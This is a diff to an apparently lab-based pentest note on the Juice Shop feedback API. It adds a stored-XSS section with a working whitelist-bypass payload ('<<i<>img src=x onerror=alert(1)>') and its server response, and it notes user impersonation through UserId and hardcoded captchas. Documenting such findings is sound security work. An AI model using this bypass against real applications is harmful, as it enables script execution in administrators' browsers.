@@ -4,7 +4,7 @@ Endpoint stores and displays customer feedback for juice shops.
 
 ## Connection Details
 
-HTTP Methods: `GET,HEAD,PUT,PATCH,POST,DELETE`
+HTTP Methods: `GET,POST`
 GET Parameters:
 - `UserId`
 - `id`
@@ -20,17 +20,7 @@ POST Parameters:
 - `UserId`
 - `id`
 
-
-## Parameters 
-
-### `UserId`
-
-#### Description
-
-Set the `UserId` of a feedback entry. No validation or verification performed, but `UserId` required to be valid for an entry to be registered. Invalid `UserId` fails due to SQL Foreign Key constraint on the field. 
-
-#### Sample
-
+### Sample Request
 Request:
 ```HTTP
 POST /api/Feedbacks/ HTTP/1.1
@@ -61,6 +51,41 @@ Connection: close
 {"status":"success","data":{"id":281,"comment":"*","rating":"*","UserId":1,"updatedAt":"2022-12-20T08:51:44.603Z","createdAt":"2022-12-20T08:51:44.603Z"}}
 ```
 
+
+## Parameters 
+
+### `UserId`
+
+#### Description
+
+Set the `UserId` of a feedback entry. No validation or verification performed, but `UserId` required to be valid for an entry to be registered. Invalid `UserId` fails due to SQL Foreign Key constraint on the field. 
+
+### `Comment`
+
+#### Description
+
+Contents are displayed at `/#/administration`, only accessible by an admin of the application. There seems to be a whitelist filter that only allows the following tags:
+- `blockquote`
+- `caption`
+- `strike`
+- `strong`
+- `table`
+- `tbody`
+- `thread`
+- `code`
+- `div`
+- `pre`
+- `em`
+- `a`
+- `b`
+- `i`
+- `p`
+- `br`
+- `hr`
+Injection point for stored XSS.
+
+
+
 ## Vulnerabilities
 
 ### Lack of Authentication (UserId)
@@ -73,8 +98,40 @@ Unauthenticated user can submit feedback on behalf of any user.
 #### Description
 Captcha answers are hardcoded and answers can be pre-calculated. For instance, the answer to captcha with `captchaId: 2` is `6`. 
 
+### Stored XSS in comment field
+ 
+#### Exploit
+```json
+{
+	"UserId":9,
+	"captchaId":9,
+	"captcha":"13",
+	"comment":"<<i<>img src=x onerror=alert(1)>",
+	"rating":2
+}
+```
+
+Results in 
+```json
+{
+	"status":"success",
+	"data":{
+		"id":527,
+		"UserId":9,
+		"comment":"<img src=x onerror=alert(1)>",
+		"rating":2,
+		"updatedAt":"2022-12-21T07:40:49.831Z",
+		"createdAt":"2022-12-21T07:40:49.831Z"
+	}
+}
+```
+
+#### Impact
+Stored XSS on admin user. 
+
+
 ## Possible Attack Vectors
 
-### ?
+### 
 
 
